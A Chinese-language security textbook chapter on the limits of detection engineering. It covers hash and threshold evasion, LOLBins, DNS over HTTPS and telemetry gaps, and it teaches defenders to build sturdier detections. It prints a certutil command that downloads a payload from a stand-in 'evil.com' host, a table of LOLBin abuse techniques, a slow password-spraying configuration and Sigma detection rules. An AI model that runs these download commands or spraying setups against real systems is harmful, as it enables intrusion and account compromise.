# Ch 34 — 偵測工程的盲點

> 目標：誠實面對偵測的極限。理解攻擊者繞過規則的具體手法、telemetry 缺口在哪裡、什麼樣的偵測設計比較強健，以及如何用重疊偵測補足盲點——不粉飾太平，但也不因此躺平。

---

## 為什麼需要這章

學完 Sigma、YARA、SIEM correlation、EDR telemetry 之後，很容易陷入一種幻覺：只要規則寫好、工具部署齊，就能偵測到攻擊。這是錯的。

偵測工程（detection engineering）的本質是軍備競賽。攻擊者閱讀的 threat intelligence 和我們一樣豐富——甚至更豐富，因為他們有動機把每一條公開規則當成規避清單。任何進入公開 GitHub 的 YARA 規則，對有經驗的攻擊者來說就是「這些特徵要避開」的說明書。

承認盲點的存在，不是在說防守沒用。防守當然有用——有偵測比沒有好，有部分涵蓋比完全無知好。重點在於：對盲點有清醒的認知，才能優先把資源投在真正有效的地方，而不是讓自己沉浸在虛假的安全感裡。

這章是 Part 5 的收尾，用紅隊視角回頭評估整個偵測體系的極限。

---

## 建立直覺

先做一個思想實驗：假設你剛發布了一條完美的 Sigma 規則，能精準偵測某個 C2 框架的網路特徵。這條規則進了 SigmaHQ 主庫，被幾百個組織的 SIEM 部署。

攻擊者在第一天就看到了這條規則。

他不需要破解 SIEM、不需要繞過你的防火牆。他只需要改一個欄位、換一個字串、重新編譯 implant。規則失效。他繼續操作。

這不是假設情境，這是現實。2021 年 Cobalt Strike 的 JARM 指紋被大量討論和規則化之後，攻擊者開始用 malleable C2 profile 和自簽憑證系統性規避 JARM 偵測。攻擊者的反應速度不慢。

直覺：**公開的偵測規則，同時也是攻擊者的規避指南。這不是理由不寫規則，而是理由要寫強健的規則——基於行為和 TTP，而不是基於易變的特徵。**

---

## 底層機制

### 一、軍備競賽的本質

偵測的基本矛盾：要偵測某個行為，你必須先看到它一次（或從 threat intelligence 推斷它）。攻擊者在行動前，會研究已知的偵測方法，然後刻意規避。

這個循環叫做**偵測-規避循環**（detection-evasion cycle）：

1. 攻擊者用技術 T
2. 防守方觀察到 T，寫規則
3. 規則進入公開庫或 threat intelligence 分享
4. 攻擊者讀到規則，改成 T'
5. 回到步驟 1

沒有出口。唯一能做的是讓步驟 3→4 的代價盡量高，讓規避的成本超過攻擊者的容忍範圍。

### 二、攻擊者繞過規則的具體手法

**a. 改 hash 破 IOC（最脆弱的偵測層）**

Hash-based detection 是目前最弱的偵測形式，但還是到處都在用。原因很簡單：它很容易理解、部署快、誤報率低。但攻擊者繞過它的成本趨近於零。

破 hash 偵測的手法，任選其一：
- 重新編譯同一份 source code，不改任何功能
- 在 PE 的 overlay（尾部）追加隨機 bytes
- 改 section 名稱（`.text` → `.AAAA`）
- 改 PE header 的 timestamp
- 添加或修改 resource section

任何一個操作都能讓 MD5/SHA256 完全不同，但程式功能一模一樣。

比 file hash 稍好一點的是 import hash（**imphash**）和**模糊雜湊**（fuzzy hash，ssdeep）。Imphash 基於 import table 的順序和內容計算，改了 hash 但不改 import 就繞不過去。但重新排列 import 順序或移除部分 import（用動態載入替代）就能繞過。

Fuzzy hash 更強健，因為它允許部分匹配——改了 10% 的 binary，ssdeep 仍能識別是同一家族。但它的誤報率較高，且攻擊者可以刻意把程式改到 fuzzy hash 距離超過閾值。

**b. 拆解行為避 threshold**

許多 SIEM 規則使用閾值型偵測（threshold-based detection）：在 N 分鐘內看到 M 次事件就告警。這對偵測暴力破解、掃描、DDoS 有效——但只要攻擊者知道閾值，就能刻意保持在閾值以下。

密碼噴灑（**password spraying**）的演進：

早期手法：用同一個常見密碼（Password1、Summer2023!）對大量帳號快速嘗試。這很快就被「N 次登入失敗告警」抓到。

進化手法：每個帳號每 30 分鐘試一次，跨越很長的時間周期。24 小時窗口裡每個帳號只有 48 次失敗——遠低於任何合理的閾值。而且失敗事件分散在時間軸上，不會在同一個時間窗口裡聚集。

這個繞過的根本原因是：**閾值型偵測假設攻擊者的行為會在短時間窗口內聚集**。慢速攻擊（slow-and-low attack）系統性規避了這個假設。

**c. LOLBins：用合法工具做惡意事**

Living off the Land Binaries（**LOLBins**）是 Windows 系統內建的合法、簽署的 Microsoft binary，攻擊者拿來執行惡意操作。你不能封鎖這些工具，因為它們對正常系統運作是必要的。

常見的 LOLBins：

| Binary | 惡意用途 |
|--------|----------|
| `certutil.exe` | 下載遠端檔案（`-urlcache -split -f`） |
| `mshta.exe` | 執行遠端 HTA 檔案（含 VBScript/JScript） |
| `wmic.exe` | 橫向移動、資訊蒐集、遠端執行 |
| `regsvr32.exe` | 載入遠端 .sct scriptlet（Squiblydoo） |
| `msiexec.exe` | 從 URL 安裝惡意 MSI |
| `rundll32.exe` | 執行任意 DLL 導出函數 |
| `bitsadmin.exe` | 背景下載檔案 |
| `forfiles.exe` | 繞過父程序鏈追蹤執行指令 |

這些都是 Authenticode 簽署的 Microsoft binary。傳統 AV/allowlist 直接放行。唯一有效的偵測方式是分析**行為 context**：這個 binary 在做什麼、parent process 是誰、目標是什麼。

**d. 時間拉長讓 SIEM 關聯失效**

SIEM correlation rule 有一個隱藏假設：同一次攻擊的相關事件會在某個時間窗口內發生。這個假設對速戰速決的攻擊成立，對 APT 不成立。

平均駐留時間（**mean dwell time**）在 2012 年是 229 天。現在由於偵測能力提升，已下降到幾週到幾個月不等——但「幾週」對於 SIEM 的 24 小時關聯窗口來說，仍然是不同的宇宙。

一個典型的 APT 操作時間線：
- Week 1：釣魚郵件進入，在一台機器建立立足點，完全靜止
- Week 3：開始 LDAP 偵察，非常慢（每天幾個查詢）
- Week 6：橫向移動到第二台機器
- Week 10：資料外傳，分散成小包在工作時間混入正常流量

沒有一個 24 小時或甚至一週的 SIEM 窗口能關聯這些事件。這需要完全不同的偵測思路：長期行為基線（baseline）比對，而不是基於時間窗口的 correlation。

**e. Signature 和規則本身的脆弱性**

規則設計存在根本性的兩難困境（dilemma）：

- 規則太**具體**（特定 hash、特定字串、特定 IP）：繞過成本極低，一改就過
- 規則太**寬泛**（任何 PowerShell 執行都告警）：誤報（false positive）爆炸，分析師看不完，最終把規則關掉

這個兩難困境沒有完美解法，但有方向：往行為和 TTP 靠，往 context 靠，遠離易變特徵。

---

## 具體案例

### 案例一：certutil.exe 下載繞過 Sigma 規則

**場景**：你部署了一條 Sigma 規則，偵測 PowerShell 下載遠端 payload：

```yaml
# 你的規則——只看 PowerShell
detection:
  selection:
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - 'DownloadFile'
      - 'Invoke-WebRequest'
      - 'WebClient'
```

**攻擊者的做法**：

```cmd
certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\Windows\Temp\update.exe
```

這條命令完全繞過你的規則，因為 `powershell.exe` 沒出現。`certutil.exe` 是合法的證書管理工具，簽署完整，功能上可以下載 URL。

**更好的偵測**：

```yaml
# 偵測 certutil 的異常下載行為
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains|all:
      - 'urlcache'
      - 'http'
```

但這也不夠——攻擊者可以用 `-f` 而不是 `-urlcache`，或用短形式的參數。真正強健的偵測是：任何 certutil 的出站 HTTP 連線，結合 child process 分析。這需要 network telemetry + process telemetry 的跨層關聯。

**教訓**：逐工具偵測（per-tool detection）是一場無止盡的 whack-a-mole。偵測應該基於**行為意圖**（出站連線 + 可執行檔寫入磁碟 + 執行），而不是特定工具名稱。

---

### 案例二：Threshold 繞過——慢速密碼噴灑

**場景**：你的 SIEM 有規則：「同一來源 IP 在 10 分鐘內對同一帳號登入失敗超過 5 次，告警」。

**攻擊者的做法**（一個真實的 password spraying 工具設定）：

```
Target accounts: 500 users from LDAP dump
Password: Welcome1
Interval: 1800 seconds (30 minutes) between attempts per account
Total duration: 10.4 days
Total failed logins: 500
Logins per hour: ~2
```

你的規則：在 10 分鐘內 5 次失敗。攻擊者每 30 分鐘一次。你的規則永遠不觸發。

即使你把窗口拉到 24 小時，每個帳號只有 48 次失敗——如果組織有數百名使用者，每人偶爾忘記密碼，48 次失敗不異常。

**更好的偵測**：
1. 不只看失敗次數，看**帳號數量**：同一來源 IP 在 24 小時內對超過 N 個不同帳號嘗試登入
2. 跨時間的 baseline 比對：這個 IP 平常登入幾個帳號？突然增加就異常
3. 用成功率而不是失敗次數：正常使用者偶爾失敗一次然後成功；噴灑攻擊是大量帳號全部失敗

**教訓**：攻擊者能輕鬆讀到閾值設定（透過 threat intel 或推斷），然後系統性保持在閾值以下。閾值型偵測需要搭配統計基線才能偵測慢速攻擊。

---

### 案例三：DNS over HTTPS 讓 DNS 監控失效

**場景**：你有 DNS proxy 和 Zeek DNS 監控，可以看到所有 DNS 查詢。一個惡意樣本使用 C2 domain `evil-c2.com`，你應該能在 DNS log 裡看到它。

**攻擊者的做法**：C2 implant 直接用 HTTPS 連線到 `1.1.1.1`（Cloudflare 的 DNS over HTTPS resolver），把 DNS 查詢藏在 HTTPS 流量裡：

```
GET /dns-query?name=evil-c2.com&type=A HTTP/2
Host: 1.1.1.1
Accept: application/dns-json
```

你的 DNS proxy 什麼都沒看到，因為這個 DNS 查詢走的是 HTTPS，不是標準的 UDP port 53。

**你剩下的 telemetry**：
- TLS 握手的 SNI：`1.1.1.1`（這是 Cloudflare，完全正常）
- 憑證指紋：Cloudflare 的合法憑證
- 後續的 TCP 連線：直接連到 `evil-c2.com` 的 IP，但你不知道這個 IP 對應的 domain 是什麼，因為你沒看到 DNS 解析

DNS 監控完全失效。唯一剩下的選項是：
1. 封鎖對非授權 DoH resolver 的連線（但攻擊者可以用你允許的 resolver）
2. TLS inspection（有隱私和效能代價）
3. 監控到 `1.1.1.1:443` 的不尋常連線頻率或模式

**教訓**：加密本身不是問題，但加密讓傳統 telemetry 失效。每一層加密都消除了一層 visibility。現代攻擊者刻意把 C2 藏在合法雲端服務後面（**domain fronting**），讓網路層偵測幾乎無效。

---

## Telemetry 缺口（Telemetry Gap）

這是很多 detection team 不願意承認的問題：你的偵測涵蓋的不是整個環境，而是你**能看到的部分**。

### EDR 沒裝的機器

典型企業環境裡，以下設備通常沒有 EDR agent：
- Legacy Windows XP/Server 2003/2008（EDR agent 不支援）
- Linux 伺服器（有些 EDR 支援，但部署率遠低於 Windows）
- IoT 設備（智慧電視、IP 攝影機、門禁系統）
- OT/ICS 設備（PLC、HMI、工業控制器）
- 網路設備（router、switch、防火牆本身）
- 印表機、影印機（有完整 OS，有時有 shell）

這些設備對攻擊者非常有吸引力，正是因為它們在偵測盲區。2021 年的 Verkada 攻擊就是從 IP 攝影機進入。

### 加密流量

TLS 1.3 讓網路層偵測更難：
- 沒有 payload visibility（廢話）
- 更少的 metadata：TLS 1.3 加密了更多 handshake 內容
- Encrypted Client Hello（ECH）會把 SNI 也加密掉（部分部署中）

Zeek 和 Suricata 剩下的：JA3/JA3S 指紋（但已被廣泛 spoof）、憑證資訊、連線模式（timing、封包大小分布）。這些仍然有用，但比有 payload 的時代弱很多。

### Log 沒收全

Windows 事件轉發（**Windows Event Forwarding, WEF**）如果設定不當，某些機器的 log 就不會進 SIEM。UDP syslog 沒有重傳機制，封包丟失就是真的丟失。

更糟的是：**你不知道你不知道什麼**。如果一台機器的 log 沒進來，SIEM 裡不會有錯誤訊息，只是那台機器的事件消失了，就像它什麼都沒發生一樣。

### 雲端和 Shadow IT

未受管理的雲端資源（**shadow IT**）：業務單位自己起的 AWS 帳號、開發者自己建的 S3 bucket、沒有掛在中央 CloudTrail 下的資源。

攻擊者利用的雲端基礎設施：攻擊者的 C2 server 開在你的 AWS 帳號裡，用被竊的 IAM credential，你的 CloudTrail 裡有記錄，但你的 SIEM 沒有吃到那個 AWS 帳號的 CloudTrail。

---

## 偵測方法的脆弱性對比

從最脆弱到最強健的偵測方法：

| 偵測層級 | 範例 | 繞過成本 | 強健性 | 誤報風險 |
|----------|------|----------|--------|----------|
| File hash (MD5/SHA256) | 比對已知惡意檔案 hash | 極低（重新編譯即可）| 最弱 | 低 |
| Import hash (imphash) | 比對 import table hash | 低（改 import 順序）| 弱 | 低 |
| Fuzzy hash (ssdeep) | 允許部分匹配的 hash | 中（需大幅改程式）| 中弱 | 中 |
| 字串/Yara signature | 特定字串、函數名稱 | 低（字串混淆）| 弱 | 低~中 |
| 固定 IP/Domain IOC | C2 server 的位址 | 極低（換基礎設施）| 最弱 | 低 |
| Threshold-based | N 次失敗在 T 時間內 | 低（降低速率）| 弱 | 中 |
| 工具型行為 | PowerShell 下載 | 低（換 LOLBin）| 弱 | 高 |
| 行為 + Context | Word 生出 cmd.exe | 中（需改攻擊鏈）| 強 | 中低 |
| TTP-level (ATT&CK) | 無 MFA 的帳號在新位置登入 | 高（需改戰術）| 最強 | 中 |
| 統計基線偏差 | 流量突然是平均值的 5 倍 | 高（需融入基線）| 強 | 中 |

**核心原則**：越靠近「what」（用了什麼工具）就越脆弱；越靠近「how」（做了什麼操作）和「why」（目的是什麼）就越強健。

---

## 踩雷

**「我們有 EDR」不等於「我們有完整 telemetry」**

EDR agent 可能：掛掉（process crash）、被攻擊者 kill（需要高權限，但 kernel exploit 做得到）、根本沒部署到某些 OU 或 legacy 系統。定期用資產清單交叉比對 EDR enrollment，確認每台機器都在。

**SIEM 的時間窗口設計是一個隱藏的設計決策，通常沒人認真算**

大部分時間窗口是「感覺合理」設出來的，不是基於攻擊者的實際行為速率。這個窗口你要能回答：「如果攻擊者把速率降到這個閾值的一半，我們會不會發現？」

**公開的 YARA/Sigma 規則庫是雙刃劍**

你把 SigmaHQ 上的規則全部匯入 SIEM，覆蓋率看起來很好看。但攻擊者也在讀 SigmaHQ。部分組織會把自己特定環境的規則保密，不公開。這是合理的，也是公開 threat intel 的本質限制。

**TLS inspection 聽起來好，但代價高**

TLS inspection（又叫 SSL inspection）需要在中間放 proxy，解密再重新加密。問題：(1) 效能代價不小 (2) Certificate pinning 的 App 會壞掉 (3) 法律和隱私疑慮（員工個人使用的加密流量） (4) 部分組織在特定地區受到 data privacy 法規限制。即使你克服這些，TLS 1.3 + ECH 讓部分流量仍然不透明。

**Coverage report 可能是自欺欺人**

對高層說「我們涵蓋了 ATT&CK 的 70% techniques」聽起來很好。但這個 70% 怎麼算的？「有規則」就算有涵蓋？規則多久沒測試過了？誤報率高到分析師把它關掉了還算涵蓋嗎？真正的涵蓋度需要定期的**detection validation**，用已知的 TTP 實際測試規則是否還在觸發。

---

## 進階：紅隊視角的偵測工程（Adversarial Detection Engineering）

### 用 ATT&CK Navigator 做涵蓋度分析

MITRE ATT&CK Navigator 是一個視覺化工具，讓你把自己的偵測規則對應到 ATT&CK 的 techniques 上，然後看哪些格子是空的。

這產生一個**偵測涵蓋度熱圖**（detection coverage heatmap）：紅色格子是完全沒有偵測的 technique，橘色是有但弱，綠色是有信心的偵測。

這個熱圖對 detection team 最誠實的自我評估工具。不是給高層看的報告，而是給自己看的作戰地圖——空白在哪裡，優先補哪裡。

### Atomic Red Team：自動化測試偵測有效性

Red Canary 的 Atomic Red Team 是一個開源的小型 TTP 測試框架，每個 ATT&CK technique 都有一個對應的「atomic test」——一段最小化的測試程式，真實執行那個 technique 並觀察是否觸發告警。

```powershell
# 安裝 Invoke-AtomicRedTeam
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1"

# 測試 T1059.001 (PowerShell 執行)
Invoke-AtomicTest T1059.001

# 測試 T1548.002 (UAC Bypass)
Invoke-AtomicTest T1548.002

# 測試後清理
Invoke-AtomicTest T1059.001 -Cleanup
```

**（示意，依樣本而異）**

這讓你能定期（每月、每季）自動驗證：已知的 TTP 測試是否還在觸發你的偵測規則。如果某條規則在 atomic test 之後沒有告警，那條規則可能已經失效或規避了。

### Detection Decay：規則的老化問題

規則不是永久有效的。幾種會導致規則失效的變化：
- 攻擊者更新工具，移除了規則抓的特徵
- Windows/Linux 更新改變了 API 行為，讓 telemetry 欄位變動
- 你的 SIEM 的 log source 改了格式，但規則的欄位映射沒更新
- 環境變化讓誤報率暴增，分析師靜音了這條規則

解決方法是建立**detection decay 機制**：每條規則有一個「last validated」日期，超過一定時間（例如 90 天）沒有被測試或觸發過真實事件，就自動標記需要 review。這不是工具功能，而是 process——但沒有這個 process，你的規則庫會慢慢腐爛，coverage heatmap 越來越不反映現實。

### Purple Team 演練

**Purple team** 是 red team（攻擊）和 blue team（防守）協同工作的演練模式。不是純粹的對抗，而是：
1. Red team 執行一個 TTP
2. Blue team 觀察是否有偵測
3. 雙方一起討論：為什麼有效？為什麼沒效？怎麼改善？
4. 修正規則，重新測試

這個回饋循環是目前最有效的提升偵測涵蓋度的方法。相比純 red team（偷偷進來，結束後給報告），purple team 能直接把知識傳給 blue team，而不是只說「你們沒發現」。

---

## 本章重點整理

- 偵測工程是軍備競賽：公開的規則同時也是攻擊者的規避指南，這個循環沒有出口
- Hash-based detection 是最脆弱的一層，繞過成本趨近於零；TTP-level 的行為偵測最強健
- LOLBins 的存在讓「封鎖工具」策略失效，必須轉向行為 context 分析
- Threshold-based detection 對慢速攻擊系統性失效，需要搭配統計基線
- Telemetry 缺口（EDR 未部署的設備、加密流量、未收全的 log、雲端 shadow IT）在真實環境中普遍存在
- DoH 等加密協定讓傳統網路層 DNS 監控失效，每一層加密都消除一層 visibility
- SIEM 的關聯時間窗口是隱藏的設計決策，對長駐留時間的 APT 系統性失效
- 承認盲點不是投降：用重疊偵測（endpoint + network + cloud + identity 四平面）補足，並對空白有清醒認知
- Detection decay 是真實問題：規則需要定期用 Atomic Red Team 等工具驗證是否還有效
- ATT&CK Navigator 熱圖是對自己誠實的涵蓋度評估工具，不是給高層看的報告

---

## 自我檢核

- [ ] 我能說出 hash-based detection 被繞過的三種方式，以及 imphash 為什麼比 file hash 稍強但仍然脆弱
- [ ] 我理解 threshold-based detection 對慢速攻擊失效的根本原因，並能提出替代偵測策略
- [ ] 我能列出至少五種 LOLBins，以及為什麼不能直接封鎖它們
- [ ] 我理解 SIEM 關聯時間窗口的設計如何影響對 APT 的偵測能力
- [ ] 我能解釋 DNS over HTTPS 如何讓傳統 DNS 監控失效，以及剩下哪些 telemetry 可用
- [ ] 我能描述哪些設備類型通常在 EDR 覆蓋之外，以及這對整體偵測體系的意義
- [ ] 我理解「脆弱的偵測」和「強健的偵測」的差異，並能用偵測方法對比表說明
- [ ] 我知道 Atomic Red Team 是什麼，以及它如何用來驗證規則有效性
- [ ] 我理解 detection decay 的概念，以及為什麼需要定期重新驗證規則
- [ ] 我能解釋 purple team 和純 red team 的差異，以及為什麼 purple team 對 detection engineering 更有價值

---

## 延伸閱讀

1. **MITRE ATT&CK Navigator**（https://mitre-attack.github.io/attack-navigator/）
   直接操作這個工具，把你自己環境的偵測規則對應上去，生成涵蓋度熱圖。空格就是你的盲點地圖，比讀任何文章都更具體。

2. **Red Canary, "Threat Detection Report"**（年度報告，https://redcanary.com/threat-detection-report/）
   每年分析真實偵測到的前 N 個 TTP。對照看：這些 TTP 你的環境有偵測嗎？這份報告同時告訴你攻擊者最常用什麼、防守方最常漏什麼。

3. **Daniel Miessler, "The Detection Maturity Level Model"**（DML，https://ryanstillions.blogspot.com/2014/04/the-dml-model_21.html）
   早期但仍然有洞察的偵測成熟度模型：從偵測 hash（最低）到偵測 TTP（最高）。理解為什麼高成熟度偵測更難建但更有價值。

4. **Florian Roth, "Sigma Rule False Positive Dilemma"**（作者 blog）
   Sigma 規則的主要貢獻者誠實面對規則設計的困難：太具體就會被繞過，太寬泛就誤報爆炸。這篇討論了實際設計決策的思考過程。

5. **"Hunting for LOLBins" — LOLBAS Project**（https://lolbas-project.github.io/）
   完整的 LOLBins 目錄，每個 binary 有詳細的惡意用途說明和偵測建議。這是 detection engineer 和 red teamer 都應該精讀的資料庫。

---

*本章對應的前置知識：[Ch 7 IOC vs IOA 偵測邏輯](./07-ioc-vs-ioa.md)、[Ch 8 Sigma 規則工程](./08-sigma-rules.md)、[Ch 10 ATT&CK 映射](./10-attck-mapping.md)、[Ch 30 偵測規避技術](./30-detecting-evasion.md)*

→ [Ch 35 事件分級與 SOAR](./35-alert-triage-soar.md)
